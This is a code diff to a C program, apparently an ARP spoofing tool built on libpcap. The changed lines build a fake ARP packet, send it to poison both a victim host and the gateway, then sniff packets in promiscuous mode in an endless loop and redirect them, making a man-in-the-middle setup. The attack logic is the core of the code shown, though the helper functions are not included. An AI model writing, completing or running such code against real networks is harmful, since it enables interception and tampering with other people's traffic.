@@ -17,7 +17,7 @@ int main()
 	choiceDev = ChoiceDev(alldevs);
 
 	/* Get Handle From choice Device */
-	handle = pcap_open_live(choiceDev->name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 1000, errbuf);
+	handle = pcap_open_live(choiceDev->name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 1, errbuf);
 	if (handle == NULL) {
 		fprintf(stderr, "Couldn't open device %s: %s\n", choiceDev->name, errbuf);
 		exit(1);
@@ -45,29 +45,26 @@ int main()
 		else
 			printf("%.2X-", LanInfo.gatewayMAC[i]);
 	}
-	ARPHEADER TEST_header;
-	setArpHeader(&TEST_header);
-	attackvictim(handle, &TEST_header, &LanInfo);
+	/* send fake arp packet */
+	ARP_PACKET arpPacket;
+	arpPacket.ethernet.etherType = ntohs(ARP);
+	setArpHeader(&arpPacket.arp);
+	attackvictim(handle, &arpPacket, &LanInfo);
 	Sleep(500);
-	attackRouter(handle, &TEST_header, &LanInfo);
-	// sniff packet 
-	int res;
+	attackRouter(handle, &arpPacket, &LanInfo);
+	/* sniff packet */
 	struct pcap_pkthdr* header;
 	const u_char* packet;
-	while ((res = pcap_next_ex(handle, &header, &packet)) >= 0)
+	printf("listen...");
+	while (1)
 	{
-		if (res == 0)
-			continue;
-		if (checkARP(handle, packet, &LanInfo))
-			continue;
-		else
+		if (pcap_next_ex(handle, &header, &packet) == 1)
 		{
-			packetRedirect(handle, header, packet, &LanInfo);
+			if (checkARP(handle, packet, &LanInfo))
+				continue;
+			else
+				packetRedirect(handle, header, packet, &LanInfo);
 		}
-	}
-	if (res == -1) {
-		printf("Error reading the packets: %s\n", pcap_geterr(handle));
-		return -1;
 	}
 	pcap_close(handle);
 	return 0;
